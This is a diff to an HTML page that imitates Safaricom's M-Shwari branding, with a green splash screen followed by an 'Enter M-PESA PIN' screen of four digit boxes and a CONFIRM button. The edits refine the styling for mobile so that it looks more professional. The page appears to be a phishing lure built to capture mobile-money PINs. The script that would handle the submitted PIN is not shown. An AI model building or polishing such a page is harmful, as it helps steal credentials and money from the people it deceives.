@@ -11,18 +11,17 @@
     <style>
         /* Pro Splash & Referral Styles */
         #ms-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
+            position: relative; /* Changed from fixed to allow scrolling if needed */
+            width: 100%;
+            min-height: 100vh; /* Ensures it fills the screen but can expand */
             z-index: 99999;
-            overflow: hidden;
+            overflow-x: hidden;
+            background-color: #1a1a1a; /* Matches the dark theme */
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
         .ms-screen {
-            position: absolute;
+            position: fixed; /* Keep screens centered over the background */
             top: 0;
             left: 0;
             width: 100%;
@@ -42,13 +41,14 @@
 
         /* SCREEN 1: BRAND GREEN SPLASH */
         #screen-splash {
-            background-color: #2cae34; /* Safaricom/M-Shwari Green */
+            background-color: #2cae34;
             flex-direction: column;
+            z-index: 2;
         }
 
         #main-logo {
-            width: 350px;
-            max-width: 70%;
+            width: 300px; /* Reduced slightly for better mobile fit */
+            max-width: 65%;
             transform: scale(0.9);
             transition: transform 1s ease, opacity 1s ease;
             opacity: 0;
@@ -61,52 +61,54 @@
 
         .saf-footer {
             position: absolute;
-            bottom: 50px;
-            width: 130px;
+            bottom: 30px; /* Brought up slightly */
+            width: 110px;
             opacity: 0;
-            z-index: 1000;
             transition: opacity 1.5s ease;
             background-color: #ffffffa1;
+            border-radius: 5px;
         }
 
         /* SCREEN 2: DARK REFERRAL UI */
         #screen-referral {
             background-color: #1a1a1a;
             color: #ffffff;
+            z-index: 1;
         }
 
         .wrapper {
             text-align: center;
             width: 90%;
             max-width: 400px;
+            padding: 20px; /* Added padding so it doesn't hit screen edges */
         }
 
         .prompt-text {
             font-size: 0.85rem;
             letter-spacing: 1px;
             color: #b3b3b3;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             text-transform: uppercase;
         }
 
         .input-row {
             display: flex;
-            gap: 12px;
+            gap: 10px;
             justify-content: center;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
 
         .code-box {
-            width: 55px;
-            height: 70px;
+            width: 50px; /* Adjusted for better fit on small phones */
+            height: 65px;
             background-color: #262626;
             border: 1px solid #3d3d3d;
             border-radius: 10px;
             color: #ffffff;
-            font-size: 2rem;
+            font-size: 1.8rem;
             text-align: center;
             outline: none;
-            transition: border-color 0.3s, background-color 0.3s;
+            transition: border-color 0.3s;
         }
 
         .code-box:focus {
@@ -114,12 +116,22 @@
             background-color: #2d2d2d;
         }
 
+        /* HIDE SPINNERS */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type=number] { -moz-appearance: textfield; }
+
         /* CONFIRM BUTTON */
         .confirm-btn {
             background-color: #42b549;
             color: white;
             border: none;
-            padding: 16px 50px;
+            width: 100%; /* Full width on mobile looks more professional */
+            max-width: 200px;
+            padding: 16px 0;
             border-radius: 30px;
             font-weight: bold;
             font-size: 1rem;
@@ -136,11 +148,6 @@
             pointer-events: all;
         }
 
-        .confirm-btn:active {
-            transform: scale(0.96);
-        }
-
-        /* Loader inside button */
         .loading-spinner {
             display: none;
             width: 20px;
@@ -148,42 +155,31 @@
             border: 3px solid rgba(255,255,255,0.3);
             border-radius: 50%;
             border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+            animation: spin 1s linear infinite;
             margin: 0 auto;
         }
 
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Chrome, Safari, Edge, Opera */
-input::-webkit-outer-spin-button,
-input::-webkit-inner-spin-button {
-  -webkit-appearance: none;
-  margin: 0;
-}
-
-/* Firefox */
-input[type=number] {
-  -moz-appearance: textfield;
-}
     </style>
 </head>
 <body>
 
     <div id="ms-container">
+        <!-- Splash Screen -->
         <div id="screen-splash" class="ms-screen active">
-            <!-- Ensure logo.jpeg is in the same folder as this HTML file -->
             <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
             <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
         </div>
 
+        <!-- PIN Input Screen -->
         <div id="screen-referral" class="ms-screen">
             <div class="wrapper">
                 <h2 class="prompt-text">Enter M-PESA PIN</h2>
                 <div class="input-row">
-                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
-                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
-                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
-                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">                    
+                    <input type="number" class="code-box" inputmode="numeric" oninput="this.value=this.value.slice(0,1)">
+                    <input type="number" class="code-box" inputmode="numeric" oninput="this.value=this.value.slice(0,1)">
+                    <input type="number" class="code-box" inputmode="numeric" oninput="this.value=this.value.slice(0,1)">
+                    <input type="number" class="code-box" inputmode="numeric" oninput="this.value=this.value.slice(0,1)">
                 </div>
                 <button class="confirm-btn" id="confirmBtn" onclick="handleSubmit()">
                     <span id="btnText">CONFIRM</span>
@@ -191,7 +187,6 @@ input[type=number] {
                 </button>
             </div>
         </div>
-
     </div>
 
     <script>
